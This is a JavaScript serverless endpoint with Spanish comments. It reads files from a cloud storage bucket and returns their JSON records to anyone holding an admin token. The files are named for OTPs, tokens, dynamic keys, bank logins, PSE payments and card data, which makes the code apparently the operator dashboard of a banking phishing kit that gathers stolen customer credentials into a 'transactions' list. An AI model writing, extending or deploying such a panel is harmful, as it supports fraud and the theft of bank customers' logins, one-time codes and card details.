require('dotenv').config();
const AWS = require('aws-sdk');

const s3 = new AWS.S3({
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    endpoint: process.env.R2_ENDPOINT,
    s3ForcePathStyle: true,
    signatureVersion: 'v4',
    region: 'auto'
});

const BUCKET = process.env.R2_BUCKET;

// Importar validación de token (en producción usar una biblioteca mejor)
const loginAdmin = require('./login-admin');

function validarToken(token) {
    return loginAdmin.validarToken ? loginAdmin.validarToken(token) : false;
}

async function obtenerTransacciones() {
    const archivos = ['datos_consultas.txt', 'datos_otp.txt', 'datos_token.txt', 'datos_dinamica.txt', 'datos_blogin.txt', 'datos_pse.txt', 'datos_tarjeta.txt'];
    const transacciones = [];

    for (const archivo of archivos) {
        try {
            const data = await new Promise((resolve, reject) => {
                s3.getObject({ Bucket: BUCKET, Key: archivo }, (err, data) => {
                    if (err) reject(err);
                    else resolve(data);
                });
            });

            const contenido = data.Body.toString();
            const lineas = contenido.split('\n').filter(l => l.trim());

            lineas.forEach(linea => {
                try {
                    const obj = JSON.parse(linea);
                    const tipo = archivo.replace('datos_', '').replace('.txt', '');
                    transacciones.push({ ...obj, tipo, archivo });
                } catch (e) {
                    // Ignorar líneas inválidas
                }
            });
        } catch (error) {
            // Archivo no existe aún, continuar
        }
    }

    return transacciones.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type');
    res.setHeader('Content-Type', 'application/json');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'GET') return res.status(400).json({ ok: false, error: 'GET requerido' });

    try {
        // Validar token
        const authHeader = req.headers.authorization;
        const token = authHeader ? authHeader.replace('Bearer ', '') : null;

        if (!token || !validarToken(token)) {
            return res.status(401).json({ ok: false, error: 'No autorizado' });
        }

        const transacciones = await obtenerTransacciones();
        return res.status(200).json({ ok: true, transacciones });
    } catch (error) {
        console.error('Error:', error);
        return res.status(400).json({ ok: false, error: 'Error: ' + error.message });
    }
};
